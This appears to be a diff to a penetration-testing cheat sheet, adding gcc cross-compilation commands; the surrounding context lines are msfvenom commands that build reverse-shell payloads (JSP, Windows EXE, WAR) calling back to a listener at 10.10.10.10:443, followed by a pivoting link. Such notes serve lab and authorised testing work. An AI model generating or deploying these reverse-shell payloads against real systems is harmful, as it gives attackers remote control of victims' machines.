@@ -97,6 +97,11 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > shel
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > shell.exe  
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war > shell.war  
 
+Compile:
+--------------------------------------------------
+apt-get install libc6-dev-i386 gcc -Wall -m32 -o <output> <code>  // on x64 for x32  
+gcc -Wall -m64 -o <output> <code>  // on x64 for x64  
+
 Pivoting:
 --------------------------------------------------
 https://github.com/21y4d/Notes/blob/master/Pivoting.txt  
